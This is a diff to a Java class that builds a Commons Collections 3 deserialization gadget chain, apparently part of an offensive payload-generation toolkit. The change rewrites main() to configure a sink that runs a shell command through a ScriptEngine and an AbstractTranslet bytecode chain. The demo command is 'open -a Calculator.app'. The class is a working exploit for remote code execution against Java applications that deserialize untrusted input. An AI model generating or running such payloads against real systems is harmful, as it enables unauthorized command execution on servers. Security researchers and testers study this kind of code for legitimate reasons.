@@ -1,5 +1,6 @@
 package com.ppp.chain.commonscollections3;
 
+import com.ppp.JavaClassHelper;
 import com.ppp.KickOff;
 import com.ppp.ObjectPayload;
 import com.ppp.annotation.Authors;
@@ -7,6 +8,8 @@ import com.ppp.annotation.Dependencies;
 import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
+import com.ppp.sinks.annotation.EnchantEnums;
+import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.Reflections;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
@@ -30,7 +33,19 @@ import java.util.Map;
 public class CommonsCollections3 implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollections3.class, args);
+//        PayloadRunner.run(CommonsCollections3.class, args);
+
+        SinksHelper sinksHelper = new SinksHelper();
+        sinksHelper.setSink(CommonsCollections3.class.getAnnotation(Sink.class).value()[0]);
+        sinksHelper.setEnchant(EnchantType.DEFAULT);
+        sinksHelper.setCommandType(EnchantEnums.ScriptEngine);
+        sinksHelper.setSplit(true);
+        sinksHelper.setCommand("open -a Calculator.app");
+//        sinksHelper.setCommand("ifconfig");
+        JavaClassHelper javaClassHelper = new JavaClassHelper();
+        javaClassHelper.setExtendsAbstractTranslet(true);
+        sinksHelper.setJavaClassHelper(javaClassHelper);
+        PayloadRunner.run(CommonsCollections3.class, args, sinksHelper);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
